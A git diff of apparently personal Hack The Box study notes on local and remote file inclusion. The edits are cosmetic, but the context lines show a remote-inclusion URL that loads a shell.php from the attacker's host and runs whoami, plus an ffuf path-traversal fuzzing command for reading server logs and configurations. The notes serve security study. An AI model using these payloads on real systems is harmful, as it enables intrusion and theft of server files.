@@ -212,6 +212,7 @@ Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 ```
 
 We use: `http://SERVER:PORT/index.php?language=\\ourIP\shell.php&cmd=whoami`
+
 ## LFI and File Uploads
 
 In this kind of attack we don't need the file upload form to be vulnerable, we just need to upload the file. If the vulnerable function has `Execute` capabilities then the code within the file will get executed if we include it.
@@ -389,7 +390,7 @@ We may also use the same [LFI-Jhaddix.txt](https://github.com/danielmiessler/Sec
 #### Server Logs/Configurations
 Look for logs and configurations, we may also use the [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) wordlist, as it contains many of the server logs and configuration paths we may be interested in. If we wanted a more precise scan, we can use this [wordlist for Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux) or this [wordlist for Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows), though they are not part of `seclists`, so we need to download them first. Let's try the Linux wordlist against our LFI vulnerability, and see what we get:
 ```shell-session
-Morrigar@htb[/htb]$ ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
+$ ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
 
 ...SNIP...
 
